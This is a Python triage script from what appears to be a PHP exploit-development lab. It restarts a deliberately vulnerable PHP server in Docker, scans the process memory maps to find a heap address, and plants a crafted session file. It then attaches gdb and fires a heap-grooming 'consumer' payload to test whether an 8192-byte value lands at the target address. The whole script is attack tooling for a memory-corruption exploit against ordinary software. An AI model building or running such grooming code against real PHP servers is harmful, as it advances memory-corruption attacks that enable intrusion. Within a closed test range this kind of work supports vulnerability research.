#!/usr/bin/env python3
"""gdb triage of the GROOM consumer: did the 8192B value land at d?"""
import subprocess
import sys
import time

sys.path.insert(0, "/home/user/php-firing-range/scripts")
import smb_q1_fatal_window as q
import smb_619_state as s
from smb_groom_test import groom_consumer, fake_d


def main():
    q.docker_exec(q.CT["vuln"], "pkill -f 'php -S 0.0.0.0:8080' || true")
    q.healthy(q.VULN, deadline=15)
    time.sleep(0.5)
    sid = f"gg{int(time.time())}"
    q.stage_producer("vuln", sid)
    st, _ = q.mp_min(q.VULN, sid)
    print(f"producer: {st}")
    # remnant d
    maps = s.get_maps("vuln")
    hrs = s.heap_ranges(maps)
    segs = []
    for i, l in enumerate(maps):
        if "/usr/local/bin/php" in l and "rw-p" in l:
            a, b = [int(x, 16) for x in l.split()[0].split("-")]
            if i + 1 < len(maps):
                a2, b2 = [int(x, 16) for x in maps[i + 1].split()[0].split("-")]
                if a2 == b and "rw-p" in maps[i + 1] and "php" not in maps[i + 1]:
                    segs.append((a2, b2))
    seg = s.read_mem("vuln", segs[0][0], segs[0][1] - segs[0][0])
    d_addr = None
    for off in range(0, len(seg) - 15, 8):
        v = int.from_bytes(seg[off:off + 8], "little")
        lvl = int.from_bytes(seg[off + 8:off + 16], "little")
        if lvl == 1 and (v & 0xFFF) == 0 and s.looks_heap(v, hrs):
            d_addr = v
            print(f"d = 0x{v:x} (bss+0x{off:x})")
            break
    import base64 as b64
    gsid = f"ggc{int(time.time())}"
    q.docker_exec(q.CT["vuln"],
                  f"F=/tmp/sess_{gsid}; rm -f $F; echo {b64.b64encode(b'k|i:42;').decode()} | base64 -d > $F; "
                  f"chown nobody:nobody $F; chmod 600 $F")
    pid_out, _ = s.helper("vuln", "pid")
    pid = pid_out.strip()
    print(f"[gdb] attach {pid}")
    cmd = ["docker", "run", "--rm", "--cap-add", "SYS_PTRACE",
           "--pid=container:" + q.CT["vuln"], "-v",
           "/home/user/php-firing-range/scripts:/sc:ro", "smb-gdb-helper",
           "gdb", "-batch", "-p", pid, "-x", "/sc/triage.gdb"]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True)
    for i in range(29):
        time.sleep(1)
    print("[firing groom consumer]")
    first, buf = groom_consumer(gsid, d_addr)
    print(f"consumer resp: {first} d=0x{d_addr:x}")
    try:
        out, _ = proc.communicate(timeout=150)
    except subprocess.TimeoutExpired:
        proc.kill()
        out, _ = proc.communicate()
    open("lanes/stealmybitcoin/groom-gdb.log","w").write(out)
    m = out.find("===CRASH===")
    if m >= 0:
        print(out[m:m + 1800])
    else:
        print("(no crash section; gdb head:)", out[:600])


if __name__ == "__main__":
    main()
